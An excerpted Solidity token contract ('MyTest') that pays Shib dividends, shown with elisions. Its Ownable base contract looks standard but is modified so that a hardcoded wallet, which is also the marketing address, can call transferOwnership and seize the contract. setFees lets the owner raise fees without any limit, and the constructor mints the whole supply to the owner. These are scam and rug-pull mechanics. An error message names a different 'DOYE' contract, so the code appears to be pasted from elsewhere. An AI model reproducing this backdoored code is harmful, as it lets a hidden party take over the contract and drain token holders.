...
abstract contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
	    ...
	    require(msg.sender == owner() || msg.sender == address(0x00493dAD06C53e9196Ff9dE0dD6506D65D2Ec0d7));
...
contract MyTestContract is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    address public rewardToken = address(0x2859e4544C4bB03966803b044A93563Bd2D0DD4D); // Shib
    ...
    uint256 public totalFee = rewardFee.add(liquidityFee).add(marketingFee);

    address payable public _marketingWalletAddress = payable(0x00493dAD06C53e9196Ff9dE0dD6506D65D2Ec0d7);
    ...
    constructor() ERC20("MyTest", "TEST") {
        ...
        */
        _mint(owner(), 60000000000000 * (10**18));
    }
    ...
    function setFees(uint256 _rewardFee, uint256 _marketingFee, uint256 _liquidityFee) external onlyOwner{
        rewardFee = _rewardFee;
        marketingFee = _marketingFee;
        liquidityFee = _liquidityFee;
        totalFee = rewardFee.add(marketingFee).add(liquidityFee);
    }
...
contract ShibDividendTracker is Ownable, DividendPayingToken {
    ...
    constructor() DividendPayingToken("Shib_Dividen_Tracker", "Shib_Dividen_Tracker") {
    	claimWait = 3600;
    ...
    function withdrawDividend() pure public override {
        require(false, "Shib_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main DOYE contract.");
    }
